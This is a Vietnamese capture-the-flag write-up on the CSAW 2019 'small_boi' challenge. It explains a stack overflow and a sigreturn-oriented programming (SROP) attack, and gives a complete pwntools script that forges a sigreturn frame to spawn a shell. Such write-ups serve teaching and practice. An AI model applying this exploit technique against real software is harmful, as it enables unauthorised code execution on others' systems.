# [CSAW-2019] small_boi
<p>Dòng 6, đọc 512 (0x200) byte vào buf có kích thước 32 byte.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post5/image.png)

<p>Cơ chế NX đang bật -> Thực thi shellcode trên stack là không khả thi.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post5/image-4.png)

<p>Liệt kê các gadgets quan trọng thì thấy rằng cả pop rdi và pop rsi đều không có. Tuy nhiên, vẫn còn lệnh syscall, pop rax -> Có thể sử dụng kỹ thuật SROP. Trong đó, pop rax dùng để đưa syscall number 15 (ứng với rt_sigreturn) vào thanh ghi rax, sau đó gọi syscall để kích hoạt cơ chế phục hồi context giả từ stack.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post5/image-1.png)

<p>Thử tìm chuỗi "/bin/sh" thì thấy rằng đã có sẵn nên không cần thêm vào stack nữa -> Vậy đã đủ dữ liệu cho các thanh ghi sau khi thực thi syscall rt_sigreturn</p>

![alt text](/thanhlai/post/buffer_overflow/image/post5/image-2.png)

<p>Script exploit:</p>

```
from pwn import *

context.binary = './small_boi'
p = process('./small_boi')

pop_rax = 0x000000000040018a
syscall = 0x0000000000400185
binsh_addr = 0x4001ca  

frame = SigreturnFrame()
frame.rax = 59         
frame.rdi = binsh_addr 
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall    


payload = flat(
    b'a' * 40,        
    pop_rax,
    15,                
    syscall,
    bytes(frame),
    b'/bin/sh\x00'      
)

p.sendline(payload)
p.interactive()
```

<p>Chạy script và lấy được shell.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post5/image-3.png)